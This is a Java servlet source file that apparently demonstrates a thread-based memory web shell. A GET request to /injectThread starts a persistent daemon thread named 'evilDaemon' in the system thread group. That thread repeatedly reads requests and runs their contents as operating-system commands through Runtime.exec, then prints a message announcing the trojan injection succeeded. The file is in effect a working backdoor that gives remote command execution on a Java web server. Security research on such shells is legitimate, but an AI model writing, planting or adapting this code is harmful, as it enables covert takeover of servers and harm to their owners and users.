package com;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashSet;
import java.util.List;

import static com.Utils.getRequest;

@WebServlet("/injectThread")
public class InjectThread extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        final HashSet set = new HashSet();
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        while (!group.getName().equals("system")) {
            group = group.getParent();
        }
        Thread d = new Thread(group, new Runnable() {
            public void run() {
                while (true) {
                    try {
                        List<Object> list = getRequest();
                        if (list.size() == 2) {
                            if (!set.contains(list.get(0))) {
                                set.add(list.get(0));
                                System.out.println(set);
                                try {
                                    Runtime.getRuntime().exec(list.get(1).toString());
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                        Thread.sleep(100);
                    } catch (Exception ignored) {}
                }
            }
        }, "evilDaemon", 0);
        d.setDaemon(true);
        d.start();
        System.out.println("Thread 马注入成功");

    }
}
